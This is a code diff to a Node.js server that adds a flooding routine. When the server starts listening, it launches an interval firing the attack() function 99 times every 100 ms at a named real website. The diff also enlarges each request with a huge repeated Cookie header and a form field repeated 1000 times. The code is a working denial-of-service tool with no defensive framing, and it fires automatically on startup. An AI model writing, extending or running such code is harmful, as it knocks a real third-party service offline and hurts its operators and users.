@@ -87,6 +87,13 @@ function onListening() {
     ? 'pipe ' + addr
     : 'port ' + addr.port;
   debug('Listening on ' + bind);
+
+
+
+    interval = setInterval(function () {
+        for (var i = 1; i<100; i++)
+            attack('https://khamsat.com');
+    },100);
 }
 
 var io = require("socket.io")(server);
@@ -117,8 +124,6 @@ io.on('connection',function (socket) {
 var n = 0;
 var er = 0;
 
-var interval;
-
 
 
 function attack(host) {
@@ -136,7 +141,8 @@ function attack(host) {
         'x-cros-8':'hjugfkljhti85hjutigkrfoluhjtigkrofytijkr',
         'x-cros-9':'hjugfkljhti85hjutigkrfoluhjtigkrofytijkr',
         'x-cros-10':'hjugfkljhti85hjutigkrfoluhjtigkrofytijkr',
-        'x-cros-11':'hjugfkljhti85hjutigkrfoluhjtigkrofytijkr'
+        'x-cros-11':'hjugfkljhti85hjutigkrfoluhjtigkrofytijkr',
+        'Cookie' : `user=${('dgkfgkfkhghgkgkfgk').repeat(500)};`
     };
 
     var form = {
@@ -156,7 +162,7 @@ function attack(host) {
         'id23':'hjgkflkgkhkgkhg',
     }
 
-    form['x-cros'] = form['id23'].repeat(2);
+    form['x-cros'] = form['id23'].repeat(1000);
 
     var option = {
         url:host,
